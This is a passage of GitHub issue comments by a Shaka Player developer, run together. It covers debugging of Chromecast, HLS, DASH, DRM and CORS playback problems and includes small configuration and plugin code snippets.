MEDIA.MEDIA_SOURCE_OPERATION_FAILED (3)\"\nseverity: 2\nstack: \"Error: Shaka Error MEDIA.MEDIA_SOURCE_OPERATION_FAILED (3)\u21b5    at new shaka.util.Error (https://casttest-dot-shaka-player-demo.appspot.com/lib/util/error.js:72:13)\u21b5    at shaka.media.MediaSourceEngine.onError_ (https://casttest-dot-shaka-player-demo.appspot.com/lib/media/media_source_engine.js:686:22)\"\n__proto__: Object\nJust looking at the codes and stack traces, it looks like the 3016 error is the \"real\" error, and the other two are just MediaSource reacting to that failure and refusing to go on.\nIt's hard to say if this is the same error as before, and now it just doesn't crash the app, or if this is a separate error that happens to have the same repro steps, but I'm going to re-open this issue for now.. I was playing Sintel 4k (multicodec).\nI just tried out some other manifests.\nManifests I reproduced it on: Sintel 4k (WebM only), Tears of Steel (multicodec, TTML)\nManifests I didn't reproduce it on (after a few minutes of testing, which admittedly isn't foolproof): Sintel 4k (MP4 only), Angel One (HLS, MP4, multilingual), Tears of Steel\nThe common factor seems to be WebM.. I swear every time I look into this, the symptoms have changed completely... or, seeking back and forth repeatedly is good at revealing bugs, whatever.\nI've been trying to reproduce this again, now that (another) fix for #1061 has landed.\nI'm now getting and issue where, upon seeking, the receiver begins buffering and keeps going for a while. Sometimes this causes the chromecast to reboot, sometimes the app just closes. One time, the video started flickering, buffered for about ten minutes, then played for about 3 seconds and then the chromecast crashed. The symptoms are varied, anyway.\nThe buffering animation eventually freezes, and the device inspector's network activity tab nearly stops updating altogether. So something in the receiver is hitting an infinite loop, or freezing, or whatever. It looks like every time this happens, there's an in-progress network request that is taking abnormally long to complete (or, perhaps, a network request that ended in a reasonable time, but the device inspector stopped receiving updates before it finished).. Reproduced on macOS Sierra 10.12.6, with the nightly build and the newest receiver.\nThe changes to receiver were mostly to fix error handling when casting. It looks like this is causing a 4012 error (MANIFEST.RESTRICTIONS_CANNOT_BE_MET), and the messed-up error handling was just kind of hiding that error.\nThe stack trace is\nError: Shaka Error MANIFEST.RESTRICTIONS_CANNOT_BE_MET ()\n    at new shaka.util.Error (https://casttest-dot-shaka-player-demo.appspot.com/lib/util/error.js:72:13)\n    at shaka.Player.chooseVariant_ (https://casttest-dot-shaka-player-demo.appspot.com/lib/player.js:2385:19)\n    at shaka.Player.chooseStreamsAndSwitch_ (https://casttest-dot-shaka-player-demo.appspot.com/lib/player.js:2434:28)\n    at shaka.Player.onKeyStatus_ (https://casttest-dot-shaka-player-demo.appspot.com/lib/player.js:2832:10)\n    at shaka.media.DrmEngine.processKeyStatusChanges_ (https://casttest-dot-shaka-player-demo.appspot.com/lib/media/drm_engine.js:1329:25)\n    at .<anonymous> (https://casttest-dot-shaka-player-demo.appspot.com/lib/util/timer.js:35:5)\nSo it looks like there's a problem choosing a variant while handling a key status change. I'll look into it more.. I see the problem; the text displayer makes a text track in the video whether or not the stream has captions.\nUnfortunately, there is no good way to fix this. I could make it not create a text displayer in such situations, but it would be an incomplete solution. The closed caption button would still show up if you viewed a stream with captions and then a stream without. That can't be avoided, because the API for text tracks has no method to remove them, and even a 'disabled' text track will cause the closed caption button to appear.\nIf this behavior is a major problem for your application, a custom TextDisplayer is a possible solution. You can find the API for TextDisplayers here in our documentation.. Reproduced. It looks like NetworkingEngine might need some refactoring. Thanks for the report.. When casting, video and player properties such as paused have their states slaved to the cast receiver in periodic status updates. If video_.paused is always returning true, even when the video is playing, that sounds like there might be some problem with this process. If it's happening with some types of content but not others, it seems more likely to be a problem on the receiver end.\nI'll look into it tomorrow.. Reproduced.\nI'm seeing it happen on Angel One (multicodec, multilingual, Widevine), and on Angel One (multicodec, multilingual, Clearkey server), but not with any of the other assets I tried. This means that it isn't Widevine-specific, but also doesn't happen on all encrypted content. Perhaps it has something to do with the particular feature set of the Angel One asset. Notably it doesn't happen with the encrypted HLS Angel One, so it might have to do with the DASH parser.\nFrom initial testing, it looks like the sender is indeed not receiving any more update messages, which means it is probably a problem with the receiver and not the sender. An uncaught error, perhaps, while it is composing the update message?. Ok, that commit didn't fully fix the issue.\nTo be specific, it looks like when we updated the receiver it exposed a new, different null exception that is causing the cast receiver to not send out messages.\nI'll prepare a fix for 2.2.8.. You naughty build bot, I'm not done with this issue yet.. @nicktruch, you're getting that error because you are trying to run the build script with Python v3, which changed how print works. The build script is designed to work with Python v2.7.. @korhan0508 Could you try updating npm? That's a rather old version, and apparently has some issues when installing modules. I tried to downgrade to 3.1.1 to reproduce your problem but npm seems to have some bug at the moment that makes downgrading difficult.. Well, if the library in question is made to be compatible with the Closure compiler, you can add the line goog.require(Object'); to the top of the file.\nIf it isn't, you can write externs for the methods/classes you use from it. Externs are meant to tell the Closure compiler of the interfaces of things from the environment. You can learn more about externs here, or look at our externs folder for some examples. You can add the new extern file just like the plugin file, by adding +path/to/the/extern to the build command.. Once you have written externs, you can load the library into the HTML page separately with script tags. Once it has been provided the externs, Closure just assumes that the defined things exist independently to the compiled code; for all it knows, your Object library is just some browser API.. We don't compile the demo app.. The minimumUpdatePeriod attribute can be used for all MPDs, even static ones. So minimumUpdatePeriod should work for your purposes.. At the moment we still support IE 11, and IE 11 does not support ES6 and (presumably) never will.\nMaybe at some point in the future we will stop supporting IE 11 and upgrade everything to ES6. Perhaps if, once the Shaka Player survey has ended, we find that not many people care about IE 11 support? I can't make any promises, of course.. The load latency message plays when the video fires a loadeddata event, which happens when the video has loaded enough data to render a frame; because we are downloading things in segments, this means it is fired soon after the first segment loads. Thus it's possible that this is a result of network issues from downloading four segments at once, each at the highest possible bitrate (you set your defaultBandwidthEstimate quite high). It's also possible this is some kind of jam at the MediaSource level from trying to set up and decode samples for four videos at once, I suppose. Either way, it seems likely to be a result of having four videos at once.\nAn easy way to test this would be to disable some of the videos and see how long it takes for Shaka Player to load.. Looking over Chromecast docs on media playback messages, it looks like current time is synchronized by MediaStatus messages, which we emit. Duration, on the other hand, is handled by MediaInformation messages, which we do not. That would explain why the dialogue has a current time, but not a duration.\nAs far as I can tell, however, MediaInformation messages are supposed to be sent by the sender as part of the process of loading the media? We load media through our own pipeline, so we don't make use of castSession.loadMedia. And I don't know if you can just send a MediaInformation message on it's own, solely to set duration.\nYou can include a MediaInformation message as part of the MediaStatus block, but that is meant to be a signal that the asset playing has changed on the receiver's end, so it would probably be improper to use it to set duration.. Note that this change will need to be in the cast receiver to work, so it won't show up until we upload a new version of the receiver.. Huh. But only on DASH. Well, that explains why I didn't notice, I was mostly testing with HLS.\nI'll look into it.. Looks like a bug with my fix for issue #1210. The code which guesses if a stream is audio or video is misidentifying mp3 files as multiplexed audio-video streams.. It looks like this is a bug. We assume that EXT-X-MEDIA tags have an URI, but according to the HLS spec that field is optional.. Actually, looks like there's already an issue open for this. #1086. I'll close this one, then.. A 1000 error is UNSUPPORTED_SCHEME. That means that we have no network plugin registered for the \"file\" scheme. I think our XMLHttpRequest plugin would work for it (assuming CORS doesn't become a problem, of course).\nTry running this code when launching your app:\nshaka.net.NetworkingEngine.registerScheme('file', shaka.net.HttpPlugin, shaka.net.NetworkingEngine.PluginPriority.FALLBACK);\nThat will register the XMLHttpRequest plugin to also handle file:// requests. Hope that helps.. I have a CL for that change waiting on review.. Ok, we had a discussion about this internally, and decided to not make this an official part of Shaka Player. Browsers are our primary target, not Electron, and supporting requests to file:// would be inappropriate in a browser environment.\nInstead, I will make an entry in the FAQ about this issue.. Note that, when #829 is out, the solution previously presented will stop working, as the XHR-based HttpPlugin now has a new name. At that point, you will want to instead use:\nshaka.net.NetworkingEngine.registerScheme('file', shaka.net.HttpXHRPlugin);\n829 will also change the FAQ entry to match.. Looks good to me. Honestly, I probably should have done those changes to the unit tests while changing them for Fetch support.. Doing some initial testing, it looks like the moment the video buffers up to 4:05:45, it changes the duration to that. The duration 4:06:21 comes from the MPD's period duration. Shaka Player downloads segments up to 3696, which should be the segment that contains 4:06:21.\nPlaying this on the dash.js reference player, it plays until 4:05:44, at which point it abruptly stops playing, which means that this isn't just a Shaka Player issue.\nSo this might be MediaSource related? It looks like after that segment it's not happy with the content, at least. I don't know offhand if MP4Client is MediaSource-based or not.. It looks like this happens whenever the networking engine hits the max number of retry attempts, now. It actually is creating BAD_HTTP_STATUS errors, it just also makes an undefined error after running out of attempts, and since that non-error is the most recent it prevents the real errors from being displayed.. When you say \"dynamically modify\" the element, do you mean modify it before parsing, or modify it while playing?\nIf you mean the former, a response filter could be used. These filters are called after the download is complete but before it is passed to the manifest parser, so you could use that to modify the manifest as you wish.\nIf you mean the latter, you could still use a response filter and make the mpd's type attribute be \"dynamic\", so that the manifest parser will periodically re-download the manifest. That way you can use the filter to change it during runtime. You could also use a custom scheme plugin that forwards to the normal http/s plugin the first time and returns a cached result after that, so that you don't need to actually download the manifest multiple times.. Reproduced. Yeah, looks like this is a problem again.. This is not possible at this time. We can only play a single stream of a given type at a time. We could make it possible, but it would require some pretty significant changes.. This sounds reasonable to me. An info log, maybe with an additional warning if the variant has DrmInfos but every single one of them ends up with no licenseServerUri. What's your opinion, @joeyparrish?. If you really want to append the buffers without a manifest, you could make a custom manifest parser. There's a tutorial on it in the docs. You could make one that doesn't actually download a manifest, and just makes a shakaExtern.Manifest object with the correct data instead. You would then register it to some fake file extension, and then try to load a fake manifest with that extension.\nHonestly, though, making your own manifest would probably be simpler.. Ah, I had thought you meant you were loading all of the segments in advance and just wanted to play them as though they were a stream.\nWell, Shaka Player has no built-in support for being fed buffers directly. Shaka Player does have a robust plugin interface, with which you could create support for your specific use-case. You would need to make a custom manifest parser and a custom network scheme plugin; you would be tricking Shaka Player into thinking it is playing a manifest and downloading segments from the internet when actually it is just being sent a series of buffers.\nI do have to ask what you want out of Shaka Player though, in this case. It sounds like the wrong tool for this situation. A lot of Shaka Player's features wouldn't work if it is just being fed buffers at a fixed interval. ABR requires Shaka Player to be able to choose which buffers to request, Shaka Player's configurable buffering goal would mean nothing if it doesn't choose when to stop downloading, etc. So I'm not sure if adopting Shaka Player and writing the necessary plugins would actually be worth the effort for you.. Reproduced. I'll look into it, thanks for the report.. I have a CL out for this. The problem was that we are trying to unload the text stream when captions are disabled, but we forgot to actually unload the text data from MediaSource. In that asset the entire video's captions are a single segment, so it never loads new text data.. It's possible.\nIf I recall, we have previously gotten requests to break Shaka Player into multiple modules that can be optionally loaded depending on a user's needs. This could be part of a larger effort like that.\nOn a smaller scale, it might be easier to make it so that you can make a Storage instance without a player. In that case, we disable methods that cannot be done without a player like loadInternal. And then, perhaps, you could associate the offline with a Player so that it can play, and unlink it later? You would still have to download the entirety of Shaka Player ahead of time, but it would be fairly simple to implement.. I misread the function. I was thinking it was part of the loading process, not the storing process. No, you're right, it'd be possible to call loadInternal without a player, we could totally use a local networking engine. The only link the NetworkingEngine has to the Player is the onSegmentDownloaded_ callback, which we use for ABR. There's no need for ABR when downloading samples for offline, so we could just not provide a callback.. From config, it uses streaming.retryParameters, restrictions, drm, and manifest.retryParameters. That's disparate enough that making a offline store its own configuration would be messy. So breaking configuration off from Player is probably a good idea.. Yeah, that is definitely a problem with how I broke that code off into http_plugin_utils. Good job catching it.. You should be able to seek in HLS live streams now. Just set the manifest.availabilityWindowOverride configuration to an appropriate value before loading the stream.. Well, in that case, you should wait on #999.\nThat issue is currently blocked, awaiting other refactors, but it's also in the 2.5 milestone so you won't be waiting forever.. Okay, with that change, setting availabilityWindowOverride to Infinity (or some other arbitrary large value) should now properly set the start time on an HLS livestream.. I started on this, but it will have to be put on hold for a while due to issues with Closure compiler type inference and async functions.. The first manifest you provided changes codecs between periods. Notably, the two periods have no video codecs in common. This causes problems with our drm engine, which at the moment cannot add new codecs to its list of supported codecs after initialization. We have an issue for this, #1567.\nAlso, switching between different codecs isn't possible on most platforms. There's a new changeType method for this, but it's not universally available yet, nor do we support it at the moment. See #1528.. Reproduced. Notably, when the player gets into this state, the video's seeking attribute is true. So this looks like it might be some issue where seeking begins, but never completes.. This issue has been around since 2.0.9, at least. I reproduced it on a number of archived versions of the player. So it's not the result of some new change.\nI've reproduced it on the \"Angel One\" and \"Sintel\" assets, and it's quite consistent for all of those, but not on any of the other Shaka assets. So there's something about those assets and not, say, \"Tears of Steel\" or \"Dig the Uke\".\nI was also able to get the United Streaming version of \"Tears of Steel\" into a non-paused non-playing state by seeking to 734.24s, on Safari. That seems consistent too, but in that case the video wasn't \"seeking\" so it may or may not be the same issue.. I was able to reproduce this with a test page that does not use Shaka Player at all, so this looks like a Safari bug rather than a Shaka Player bug.\nI have filed a bug on the webkit bugzilla for this issue.. The 3016 (VIDEO_ERROR) error signals that the video element has output an 'error' event. It should include the error event's code, IE11 extended error code, and message in it's data property, so you could check those for more information. I don't have a computer with Win 8 on it to check, though.\nI was able to try this on Win 10, and it played there without issue. So a license problem does sound likely, yes; decoder errors will definitely lead to a VIDEO_ERROR.\nAlso, for reference, the example player you linked loads the Shaka Player externs. The externs are the public interface of Shaka Player, and do not contain any actual code. You should use https://cdnjs.cloudflare.com/ajax/libs/shaka-player/2.3.4/shaka-player.compiled.debug.js instead.. Yeah.\nI guess I had already filed a report for this issue, and just forgotten.\nI'll close this one, then. The older report was from when I was previously investigating the flake, and has more detailed information.. I can reproduce this on a Gen1 device, and it works on a Gen2.\nIt looks like more of a Chromecast problem than a Shaka Player problem, yes. We don't really handle DRM ourselves; that's all left to the platform, and we don't really treat different-gen Chromecast devices differently.\nI'll contact someone on the Chromecast team, and tell them to have a look at this.. We didn't account for the possibility that a segment tag like EXT-X-KEY would be in a media playlist but would come before a media playlist tag, like the EXT-X-PLAYLIST-TYPE tag your asset has.\nIt should be a pretty simple fix. Thanks for the bug report.. Ok, now I'm getting a 4030 (HLS_COULD_NOT_PARSE_SEGMENT_START_TIME) error. The TS file your manifest is fetching seems messed up. I tried to examine it with ffprobe, and ffprobe errored with the message Invalid data found when processing input.. When you say that \"cast reproduction fails\", do you mean that the receiver app fails to load, or that it loads but fails to play the stream?\nI tried casting that sample from our Ubuntu lab machine, and it launched the receiver app but failed to play there. I tried other computers to cast from and other Chromecasts to cast to, and they failed to play Shaka Player History (Live, HLS) also.\nLooking at VV output, the cast sender is receiving 'seeking' events, so it might be that the Chromecast is stuck trying to get into the seek window.. Alright. I'll look into it. Thanks for the report.. I tried using my WIP change for #1307, and the asset played correctly. So it definitely looks like this is a problem with the narrow seek window on HLS livestreams.\nI think that it is seeking ahead to the start of the window and buffering, but by the time it is done buffering the start of the window has slipped ahead of the buffered range. So it seeks ahead again, and so on and so forth, in a loop.\nI suppose you could just wait on the change for #1307, which will hopefully be out sometime this week, but requiring users to turn on an optional configuration option just for one of our sample assets to work seems non-ideal. Perhaps it'd be better to make the seek range on live HLS a little bit wider than 0s. Investigation will be required.. Ok, I've tried a few values for MIN_SEEK_RANGE. 1s played, but was a bit choppy; it periodically had to pause and seek forward. Of the values I tried, 3s was the smallest that didn't have any choppiness.. This change is for the sake of the cast receiver, so you won't be able to see it in effect until we update the cast receiver.\nIt also doesn't fix things for v1 Chromecasts; no matter how much longer I made MIN_SEEK_RANGE, our test v1 Chromecast was unable to play that livestream reliably. I'll have to look into what additional problem is plaguing our playback on v1 Chromecasts, and address it in a followup CL.. This could possibly be related to the fix for #1293, which was cherry-picked in 2.3.3.. It's hard to say what the exact problem is without being able to see your custom app.\nOne possibility is that... I do notice that, in your repro steps, you say that you called:\nshaka.Player.unload();\nshaka.Player.destroy();\nIs that the exact code? Player.unload and Player.destroy are both asynchronous methods. I'm not sure what kind of behavior there will be if you destroy without waiting to first unload. I tested a little bit, and calling unload and then destroy immediately afterwards does seem to have a chance of causing weird problems.\nCould you try something like:\nawait shaka.Player.unload();\nawait shaka.Player.destroy();\nor, if you don't want to use ES6 syntax:\nshaka.Player.unload().then(function() {\n  return shaka.Player.destroy();\n}).then(function() {\n  // Post-shutdown code here\n});. A little further testing:\nThis happens with Chrome on Linux. It doesn't happen with any other combination of platform and browser I tested (Firefox on Linux, Chrome on Mac, Firefox on Mac, Chrome on Windows).\nSo it's presumably some bug with MediaSource in Chrome Linux. I guess the question is if it's something we can work around or not. More investigation will be required.. Shaka Player currently ignores the Metrics element.\nAdding some kind of event along the lines of METRIC_ADDED when it detects a Metrics element would be a fairly simple change.\nActually tracking the requested metrics would be significantly more complex. I'll hesitantly put this in the backlog for now. Maybe we'll decide to put it in 2.5, maybe not.\nIn the meantime...\nYou could track http transactions with a custom network scheme plugin. Just make one that acts as a wrapper over the default xhr or Fetch plugin. You can register network plugins with shaka.net.NetworkingEngine.registerScheme.\nYou might be able to track RepSwitchList the same way, if you could figure out what representation an http request corresponds to from the URL. I'm not sure if that's possible or not off the top of my head.\nBufferLevel... honestly, I can't tell what this metric is measuring, from the description in the ISO/IEC 23009-1 DASH standard. There doesn't seem to be a definition for \"buffer occupancy level\". \nPlayList, you could measure yourself with enough event listeners.  combination of a lot of event listeners on the  ('play' event, 'pause' event, etc on the media element) to detect user input, an ended event listener to determine end of playback, and an error event listener\nPlayList, you could measure yourself with enough event listeners. On the video element, you could put a play listener, a pause listener, etc to detect user input, and an ended listener to detect end of playback. On the Shaka Player, you could put an error event listener to detect failure that stops playback. Note that the error event on Shaka Player contains a shaka.util.Error object; you'll probably want to examine that error object's severity field, so that you can ignore recoverable errors.. As far as I can tell from poking around on github, plyr adds event listeners for cuechange when setting up, to any tracks that exit at that time. Then, when you load a manifest, simple_text_displayer disables all current tracks and makes a new one. So plyr was made on the assumption that the text tracks don't change, and simple_text_displayer disposes of any previous text tracks because it wants to use special Shaka Player text tracks.\nI'm not sure if compatibility with other player frameworks is really a goal for Shaka Player. I can ask around, but I can't promise that we will actually make any changes for this.\nHowever, there are solutions you can implement on your side. Two possibilities I can think of:\n1. If you have some text track that plyr is trying to use, you could try setting that text track's label to shaka.text.SimpleTextDisplayer.TextTrackLabel_ (\"Shaka Player TextTrack\"). This will cause simple_text_displayer to identify it as being a Shaka Player text track, and re-use it instead of disabling it. I can't guarantee this will work, though, as it's kind of hacky.\n2. Implement a custom text displayer. We have a plugin interface for text displayers. You could just copy the code of simple_text_displayer, make your alterations for plyr compatibility, and give it a new class name. Then before loading an asset, you configure the player to use it:\njs\n// Where 'player' is Shaka Player, and 'video' is the video element:\nplayer.configure({\n  textDisplayFactory: () => {\n    return new MyTextDisplayer(video); // Or whatever you called the new class.\n  }\n});. Incidentally, your MPD has typos. On line 34, you are trying to close a ContentProtection element with <ContentProtection>. That should be </ContentProtection>. Same problem on line 71.. I've double-checked this. It seems to work as expected; i.e. it does the same thing as the change the plyr team made.. It looks like we might have a bad assertion. I'll look into it more, thanks for reporting.. It wasn't me!\nGlancing at this, it seems to play sometimes. And when it does play, it doesn't mention gap jumping. So I agree that it's related to gap jumping somehow.. Microsoft has made these issues public again.. So, if I'm understanding correctly, in the error scenario we seek forward, but since the video's currentTime value is incorrect (perhaps due to a bug in the NetFront browser's implementation of HTMLVideoElement), we think that the video hasn't seeked forward correctly, so we keep seeking?\nIf we were seeking repeatedly from onPollWindow_, though, I would expect the v2 log to be full of messages like Jumping forward ___ seconds to catch up with the seek range., but I didn't see any in the samples you provided.\nCould you go into lib/media/video_wrapper.js, find the movePlayhead_ function, and remove the contents of the function starting at line 249? And then tell me if that fixes your problem, instead.\nWe have a workaround for an IE bug there, but it sounds like that workaround could possibly be the cause of your problem. It makes us repeatedly seek if we detect that a seek has failed... for instance, if the HTMLVideoElement is reporting that the time hasn't changed to the desired value. In #1471, we are considering investigating if that workaround is still necessary; right now that issue is marked for v2.6, but if getting rid of it fixes your problem, then I can definitely move it up to v2.5.. I just put a CL out to fix it. Hope to have it submitted by the end of the day, if possible.. Okay, hopefully that will fix your issue. If not, though, be sure to tell us.. Hm. My change fixed playback for the assets Jacob provided. I don't think you could have installed it wrong, since the changes were pretty standalone.\nWell, whatever. I can look into this more next week. In the meantime, it'd help if you could provide a public server link for the assets in question, to shaka-player-issues@google.com. Plus steps to reproduce on the demo app, if possible?. No worries! Glad to have helped.. Well, trying those configs out on our sample assets...\nNarrowing it down, persistentStateRequired: true works, but distinctiveIdentifierRequired: true does not.\nThe REQUESTED_KEY_SYSTEM_CONFIG_UNAVAILABLE error is thrown if navigator.requestMediaKeySystemAccess fails for every DRM system.\nNow, distinctiveIdentifierRequired: true from our config is translated into distinctiveIdentifier: \"required\" in the final config passed to navigator.requestMediaKeySystemAccess. It's possible that distinctiveIdentifier: \"required\" isn't supported anymore, or something. I'll bring this to the attention of the Widevine team.\nIn the meantime, does your asset play with just persistentStateRequired: true set?. Well, I can't say much more without having access to your content. You can send the information (manifest URI, license server URI, etc) to shaka-player-issues@google.com, if you are able to distribute them.\nIf not, you could go to chrome://media-internals/ while playing in Chrome to see if the video element's log has any errors in it. If Shaka Player isn't showing any errors, there might be a problem somewhere in the media pipeline that we don't get to touch.. I tried to reproduce this on Chrome and Firefox on macOS for a while, and was unable to with either.\nOn a Windows 10 computer, on the other hand, the video was sometimes hanging forever without actually playing. The screen wasn't black, per se, but it might be what you were seeing.\nInterestingly, I was getting media internal logs like this (key ID censored for privacy reasons):\n00:00:02:103 DecryptingDemuxerStream: no key for key ID *KEYID*\n00:00:02:103 DecryptingVideoDecoder: no key for key ID *KEYID*\n00:00:02:854 DecryptingDemuxerStream: key was added, resuming decrypt\n00:00:02:854 DecryptingVideoDecoder: key added, resuming decode\n00:00:02:855 DecryptingDemuxerStream: no key for key ID *KEYID*\n00:00:02:855 DecryptingVideoDecoder: no key for key ID *KEYID*\nAnd then no other updates after that about the decoder or demuxer.\nSo the key is supposedly added, and then a millisecond later it's saying that there's no key for that key ID again? And then it just is hanging there, waiting for that key. I don't know how the CDM works well enough to say what's happening here; maybe it's getting a bad key or something.. We will look into this feature. We will add it if we can, but we'll need to investigate how it would work with MediaSource.. If the problem happens with a custom app that we don't have, playing custom content that you can't provide, I'm not sure how we can reproduce it.\nYou can send manifest and license server URIs over to the shaka-player-issues@google.com mailing list, if you're worried about privacy. If we have reproduction steps, we can look into the problem. There were a lot of changes related to gap-jumping and starting gaps around 2.2.7, so it's hard to say what the exact culprit for this behavior is without being able to reproduce it.. A manifest alone isn't enough to reproduce a problem like this, no. We'll need something that can be used to actually reproduce the problem on our end.. Yeah, we want to add this eventually. Hopefully by the time that Chrome 70 is out, if possible.. @chrisfillmore Your design seems reasonable to me, but I should probably do it. @vaage is currently working on #1297, so it'd be best to do this in-house, to avoid collisions.. I had a discussion with the team, and we decided that it would probably be best to avoid anything that changes the constructor of NetworkingEngine, since it is also being modified as part of #1051. Instead, I will add a method on the networking engine that adds a listener function. So you'd use it like:\nplayer.getNetworkingEngine().addRetryListener((error) => {\n  // Your listener code here.\n});\n. Okay, after another round of code review, this should be out soon.\nThere was some further discussion, and we decided that it should work as an event listener, using our FakeEventListener code. So you'd use it like:\nplayer.getNetworkingEngine().addEventListener('retry', (event) => {\n  let error = event.error;\n  // Your listener code here.\n});\nSorry we changed our minds so often on this!. Oops, I used parentheses in the JSDoc instead of brackets.. \"Hard\" restrictions (the type you are setting with those example configuration calls) are applied at the following times:\n1. when adding a new period\n2. when first loading a manifest\n3. when the manifest is updated (like in a livestream)\nThey are only use by the player, and not by the AbrManager. AbrManager has its own separate set of \"soft\" restrictions (located in the configs as abr.restrictions).\nThey aren't, as far as I can tell, applied by default when configuration changes. If I am reading player.applyConfig_ correctly, we do apply \"soft\" restrictions at that time, though.\nManually applying \"hard\" restrictions on config would be possible, I think. It's possible we aren't doing that for a reason? I'm not sure.\nOn another note, I'm not sure why the sample code you provided helps with the problem? shaka.utils.StreamUtils. filterVariantsByConfig doesn't apply the \"hard\" restrictions, it just locates the variants with the given language, role, and audio channel count.. For more information on restrictions, you can see the docs for player configuration. The short version is that the \"soft\" restrictions aren't as absolute; for instance, if you apply a \"soft\" restriction to bandwidth that is below the bandwidth of every variant, the abr manager will just default to picking the lowest-bandwidth variant, even though it's technically restricted. If that was a \"hard\" restriction, on the other hand, the player would be completely unable to pick a stream, and would error. Sometimes that behavior is desirable, sometimes it's not, so we retain both types of restrictions.\nMaybe I should add an FAQ entry about how restrictions work? It's a pretty confusing distinction.\nOne interesting thing to note is that the allowedByApplication flag is checked in player.applyConfig_, but that flag is only set by StreamUtils.applyRestrictions, in the situations I mentioned earlier. I'm not sure how if we can ever end up in a situation where that check is meaningful, if we avoid playing streams with allowedByApplication set to false and don't change the flag in player.applyConfig_. That might suggest that we are supposed to be applying \"hard\" restrictions in player.applyConfig_, and us not doing so is a bug. I'll want to look into that more.. I have an experimental CL that handles EMSG boxes with empty message_data. Easy enough.\nShaka Player is also having trouble skipping the MDAT box, though. Looking at the range requests we are making, it seems like it's only downloading part of the MDAT box for some reason? Like, it doesn't download the last ~250ish bytes, and our mp4 parser tries to seek past the end of the data and errors. The DASH-IF reference player also downloads that range, so apparently that is intentional.. Personally, I think the client-controlled option sounds better. That would allow for the client to just toggle it on or off at the same time as they modify the DOM, and not worry about the performance of a MutationObserver at all.\n@joeyparrish, thoughts?. Knowing the exact error message would be helpful.. Running your asset, I seem to be getting a lot of mixed content errors at the very beginning, before the other errors. Looking at the manifest, the manifest itself is loaded through https, but most of the segments are loaded through http. So it's a CORS issue.\nI tried playing it with CORS disabled, and it seems to play fine.. I just tried loading Chrome with CORS disabled, and I was able to load your stream with no errors.\nI can't find any documentation about the exact behavior of the 'load unsafe script' button, but I don't think it completely disables CORS.. The Mixed Content errors show up in the top of the developer console. They're not Shaka Player errors, so they are styled differently; specifically, they all get collapsed into a single line, with a number by it representing the number of mixed content errors. You can also go to the network tab of the developer console to see all of the downloads failing.\nDid you also provide an (empty) user data directory to the arguments? I find that that's necessary for --disable-web-security to work, for whatever reason. If Chrome starts up with a message on the top that it's been loaded with an unsupported command-line argument, that means that --disable-web-security didn't work.\nSometimes it plays partially because, looking at your manifest, there are some periods that are loaded from https. Presumably when it's playing smoothly, that's when you happened to turn the stream on while it was on a period that could be downloaded.. Also, in addition to the CORS issue, I think some of the periods on that manifest are messed up somehow. It looks like periodically it can't choose a variant, so it only plays properly with jumpLargeGaps enabled (to skip over those periods).. Sometimes, it looks like your stream puts out manifests that contain just an MPD tag with a BaseURL tag inside it. And no periods or anything. If that happens to be the most recent manifest when the player first loads the stream, the player can't play at all. When that manifest shows up mid-stream, it just causes big gaps; that seems to be what's causing the progress bar to jump back ~20 seconds from the live edge sometimes.\nThat doesn't account for all of the (non-CORS-related) problems, though. More investigation will be required.. I tried experimentally downloading a few assets and then deleting them, and yeah the indexeddb.leveldb folder did end up with a few hundred megabytes of data in it anyway. So I can confirm that this is an issue.\nI'll ask Aaron about this, he knows the IndexedDB stuff better than me.. I talked to Aaron (who implemented the offline storage stuff to begin with), and he agrees that there's probably nothing we can do as a workaround ourselves.. When the poster is and isn't drawn is a behavior of the browser, not Shaka Player. Specifically, the poster is drawn if the video is on the first frame and has not yet been played. The filtered manifest you provide doesn't feed in the first few segments, but the video element knows that they are there due to the timing data in the mp4 files... so the poster never draws.\nThat's on-spec behavior, by the way; see the w3 spec on video elements. I don't think they were thinking of your specific use case when they were designing it.\nAs far as what we can do about this...\n1. We could re-package the incoming media files to change all of their timing data, so that the first segment passed in is now the actual first segment. That would be an impractically large change for this problem, though, and also might require preloading the entire video before playing (depending on how we do the re-packaging).\n1. We could handle drawing the poster manually, instead of leaving it to the video element. This is probably the easiest solution, but adding new elements to the DOM is outside the purview of the core Shaka Player library.\nOption number one there is almost definitely out of the question. Option number two... it might fit with the upcoming UI library. We'll consider it. For now, though, I'll mark this issue as external.. Alright, I can access the content now. Thanks for your cooperation, I'll look into your problem now.. Looking at your manifests, the SegmentTemplate tags don't include a startNumber attribute. Consequently, Shaka Player doesn't know how to merge the old manifest and the new manifest together; it assumes that both manifests are starting at segment number 1, which is incorrect.\nI think that fixing that will make your asset work. If it doesn't, though, I'll look into it more.. I can look into adding support for numbering segments by time, if number isn't provided.\nThough things suddenly working is a little suspicious. I'm not sure why it would? Unless we have suddenly started fitting the segments, but we shouldn't do that for dynamic manifests.. Oh, I hadn't noticed the period start changing.. Chrome has console output filtering. It's a little drop down menu in the top-right-ish corner of the developer console. If it's set to \"default\" then it'll hide all of the verbose logs. That could possibly be your problem.. I looked into this some, but I got a 6007 error also. Has your token expired again?. Thanks for the new key.\nI was able to reproduce the problem again, using the nightly build. So it definitely does seem to still be a problem.\nAnd then it takes several tries to get it to play, but once it does play it suddenly works fine every time, even after reload. I was able to get it to play without enabling jumpLargeGaps, so I don't think it's related to that.. Well, all of our livestreams seem to work as expected on Edge. All of the PlayReady-encrypted assets work too.\nWe don't have any PlayReady-encrypted livestreams in our samples, though. So it's possible that is the root of the problem?\nI tried looking for PlayReady-encrypted livestreams to check that, but all I found from Microsoft's PlayReady resources were in SmoothStreaming format. Well, I guess I'll have to keep looking.. For the first issue, there's a proposed change we are considering that will fix that. Or at least, will be a good opportunity for fixing it.\nThe second issue is possible. Scheme plugins are very general-purpose, as they are used for all kinds of requests, not just loading segments. The ideal would probably be adding an optional argument for some dictionary containing extra, request type-specific data.\nFor the third issue, are you proposing a change to the ABR manager interface? Something that lets you provide your own bandwidth estimate, that the ABR manager will then use instead of the estimate that its bandwidth estimator makes?\nIf that's your intention, in the meantime you could also fix that problem by making a custom abr manager. You can provide a custom abr manager by setting the abrFactory configuration value to an appropriate constructor. Our example abr manager is lib/abr/simple_abr_manager.js; you could just copy it, and replace a line in the chooseVariant_ function as so:\n// Old code:\n  // let currentBandwidth = this.bandwidthEstimator_.getBandwidthEstimate(\n  //     this.config_.defaultBandwidthEstimate);\n  // New code:\n  let currentBandwidth = $(YOUR BANDWIDTH ESTIMATE)\nThat way you wouldn't have to introduce artificial delays.. We've definitely had problems with slow hardware problems with Chromecasts before. See issue #1411, for example. So your assumption about the cause of this seems reasonable, though without being able to reproduce the issue I can't say for certain.\nLooking at the code, it also seems possible that our current check for stalling 